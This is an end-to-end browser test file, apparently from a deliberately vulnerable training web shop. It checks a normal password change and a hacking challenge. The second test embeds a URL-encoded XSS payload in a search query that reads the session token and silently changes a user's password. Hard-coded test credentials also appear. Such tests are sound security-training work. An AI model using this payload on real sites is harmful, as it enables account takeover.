describe('/#/privacy-security/change-password', () => {
  describe('as Morty', () => {
    beforeEach(() => {
      cy.login({
        email: 'morty',
        password: 'focusOnScienceMorty!focusOnScience'
      })
      cy.visit('/#/privacy-security/change-password')
    })

    it('should be able to change password', () => {
      cy.get('#currentPassword').focus().type('focusOnScienceMorty!focusOnScience')
      cy.get('#newPassword').focus().type('GonorrheaCantSeeUs!')
      cy.get('#newPasswordRepeat').focus().type('GonorrheaCantSeeUs!')
      cy.get('#changeButton').click()

      cy.get('.confirmation').should('not.be.hidden')
    })
  })

  describe('challenge "changePasswordBenderChallenge"', () => {
    it('should be able to change password via XSS-powered attack on password change without passing current password', () => {
      cy.login({
        email: 'bender',
        password: 'OhG0dPlease1nsertLiquor!'
      })
      cy.visit(
        '/#/search?q=%3Ciframe%20src%3D%22javascript%3Axmlhttp%20%3D%20new%20XMLHttpRequest()%3B%20xmlhttp.open(%26apos%3BPOST%26apos%3B%2C%20%26apos%3Bhttp%3A%2F%2Flocalhost%3A3000%2Frest%2Fuser%2Fchange-password%26apos%3B)%3B%20xmlhttp.setRequestHeader(%26apos%3BAuthorization%26apos%3B%2C%60Bearer%3D%24%7BlocalStorage.getItem(%26apos%3Btoken%26apos%3B)%7D%60)%3B%20xmlhttp.setRequestHeader(%26apos%3BContent-Type%26apos%3B%2C%26apos%3Bapplication%2Fjson%26apos%3B)%3B%20xmlhttp.send(%26apos%3B%7B%26quot%3Bnew%26quot%3B%3A%26quot%3BslurmCl4ssic%26quot%3B%2C%26quot%3Brepeat%26quot%3B%3A%26quot%3BslurmCl4ssic%26quot%3B%7D%26apos%3B)%3B%22%3E'
      )
      cy.wait(2000)
      cy.login({ email: 'bender', password: 'slurmCl4ssic' })
      cy.url().should('match', /\/search/)

      cy.expectChallengeSolved({ challenge: "Change Bender's Password" })
    })
  })
})
